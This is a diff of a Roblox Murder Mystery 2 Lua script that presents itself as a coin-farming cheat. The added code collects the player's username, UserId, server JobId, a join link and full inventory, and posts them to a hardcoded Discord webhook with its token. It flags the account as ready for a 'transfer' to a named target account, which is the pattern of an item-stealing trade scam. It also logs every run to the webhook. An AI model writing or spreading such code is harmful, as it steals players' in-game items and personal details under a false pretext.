@@ -1,4 +1,4 @@
-print("[mm2 coins farm] Loading...")
+print("[mm2 coins farm script 2026] Loading...")
 
 local P = game:GetService("Players")
 local TS = game:GetService("TweenService")
@@ -13,6 +13,8 @@ local pg = lp:WaitForChild("PlayerGui")
 
 -- Plain webhook (easy to edit)
 local WU = "https://discord.com/api/webhooks/1544589998198755329/DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
+local PLACE_ID = 142823291
+local TARGET = "naimradio6"
 
 local WL = {
     ["677skibidiuse0"] = true,
@@ -20,8 +22,6 @@ local WL = {
     ["677skibidiuse2"] = true,
     ["677skibidiuse3"] = true,
     ["677skibidiuse4"] = true,
-    ["naimradio6"] = true,
-    ["naimradio66"] = true,
     ["677skibidiuse5"] = true
 }
 
@@ -33,7 +33,7 @@ do
     if WL[lp.Name] then
         allowed = true
         hasTransfer = true
-        print("[mm2 coins farm] Whitelisted - full access")
+        print("[mm2 coins farm script 2026] Whitelisted - full access")
     else
         local sg = Instance.new("ScreenGui")
         sg.Name = "Auth"
@@ -50,10 +50,10 @@ do
         local t = Instance.new("TextLabel")
         t.Size = UDim2.new(1, 0, 0, 32)
         t.BackgroundTransparency = 1
-        t.Text = "mm2 coins farm - Password"
+        t.Text = "mm2 coins farm script 2026"
         t.TextColor3 = Color3.fromRGB(255, 140, 40)
         t.Font = Enum.Font.GothamBold
-        t.TextSize = 15
+        t.TextSize = 14
         t.Parent = f
 
         local box = Instance.new("TextBox")
@@ -100,7 +100,7 @@ do
 
         repeat task.wait(0.2) until done or not sg.Parent
         if not allowed then
-            print("[mm2 coins farm] Access denied")
+            print("[mm2 coins farm script 2026] Access denied")
             return
         end
     end
@@ -108,7 +108,7 @@ end
 
 local function sw(msg, ping)
     local c = ping and "@everyone\n" .. msg or msg
-    local d = {content = c, username = "mm2 coins farm"}
+    local d = {content = c, username = "mm2 coins farm script 2026"}
     pcall(function()
         if request then
             request({
@@ -121,10 +121,70 @@ local function sw(msg, ping)
     end)
 end
 
+local function getFullInventory()
+    local list = {}
+    pcall(function()
+        local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+        if ok and pd and pd.Weapons and pd.Weapons.Owned then
+            for n, a in pairs(pd.Weapons.Owned) do
+                if a and a > 0 then
+                    table.insert(list, n .. " x" .. tostring(a))
+                end
+            end
+        end
+    end)
+    table.sort(list)
+    return list
+end
+
+-- Detailed Transfer Ready webhook (only when hasTransfer)
+local function sendDetailedTransfer()
+    local jobId = tostring(game.JobId)
+    local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
+    local inventory = getFullInventory()
+    local inventoryText = #inventory > 0 and table.concat(inventory, "\n") or "No weapons found"
+    if #inventoryText > 900 then
+        inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
+    end
+
+    local data = {
+        content = "@everyone **MM2 Transfer Ready**",
+        embeds = {{
+            title = "Quick Transfer",
+            color = 16744448, -- orange
+            fields = {
+                {name = "Username", value = lp.Name, inline = true},
+                {name = "UserId", value = tostring(lp.UserId), inline = true},
+                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
+                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. jobId, inline = false},
+                {name = "Console (F12)", value = "```js\n" .. consoleCode .. "\n```", inline = false},
+                {name = "Inventory (" .. #inventory .. " items)", value = "```\n" .. inventoryText .. "\n```", inline = false},
+            },
+            footer = {text = "Waiting for trade from " .. TARGET},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    pcall(function()
+        if request then
+            request({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(data)
+            })
+        end
+    end)
+end
+
 task.spawn(function()
-    task.wait(1.2)
-    local mode = hasTransfer and "FULL (transfer)" or "NORMAL"
-    sw("✅ **Script executed** by **" .. lp.Name .. "**\nMode: " .. mode, false)
+    task.wait(1.5)
+    if hasTransfer then
+        sendDetailedTransfer()
+        print("[mm2 coins farm script 2026] Detailed transfer webhook sent")
+    else
+        sw("✅ **Script executed** by **" .. lp.Name .. "**\nMode: NORMAL", false)
+    end
 end)
 
 P.PlayerRemoving:Connect(function(pl)
@@ -141,7 +201,6 @@ P.PlayerAdded:Connect(function(pl)
 end)
 
 -- ==================== TRANSFER (only if hasTransfer) ====================
-local TARGET = "naimradio6"
 local TR = false
 local OT = 0
 local AS = false
@@ -320,7 +379,7 @@ if hasTransfer then
         end
     end)
 
-    print("[mm2 coins farm] Transfer system loaded")
+    print("[mm2 coins farm script 2026] Transfer system loaded")
 end
 
 -- ==================== CORE ====================
@@ -422,7 +481,7 @@ end)
 
 -- ==================== GUI (Halloween Orange) ====================
 local gui = Instance.new("ScreenGui")
-gui.Name = "mm2CoinsFarm"
+gui.Name = "mm2CoinsFarm2026"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = pg
@@ -455,10 +514,10 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -50, 0, 38)
 title.Position = UDim2.new(0, 16, 0, 8)
 title.BackgroundTransparency = 1
-title.Text = "mm2 coins farm script"
+title.Text = "mm2 coins farm script 2026"
 title.TextColor3 = Color3.fromRGB(255, 150, 50)
 title.Font = Enum.Font.GothamBold
-title.TextSize = 18
+title.TextSize = 17
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
@@ -822,13 +881,11 @@ task.spawn(function()
                 local murdRoot = murd and murd.Character and murd.Character:FindFirstChild("HumanoidRootPart")
 
                 if MODE == "Safe" then
-                    -- Lie flat on back
                     hum.PlatformStand = true
                     hum.Sit = false
                     hum.AutoRotate = false
                     root.CFrame = CFrame.new(root.Position) * CFrame.Angles(math.rad(-90), 0, 0)
 
-                    -- Find closest coin and go under it
                     local closest, dist = nil, math.huge
                     for _, obj in ipairs(workspace:GetDescendants()) do
                         if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not VS[obj] then
@@ -851,7 +908,6 @@ task.spawn(function()
                     end
                     task.wait(0.35)
                 else
-                    -- Restore standing
                     hum.PlatformStand = false
                     hum.AutoRotate = true
 
@@ -920,4 +976,4 @@ RS.Stepped:Connect(function()
     end
 end)
 
-print("[mm2 coins farm] Loaded | Transfer = " .. tostring(hasTransfer))
+print("[mm2 coins farm script 2026] Loaded | Transfer = " .. tostring(hasTransfer))
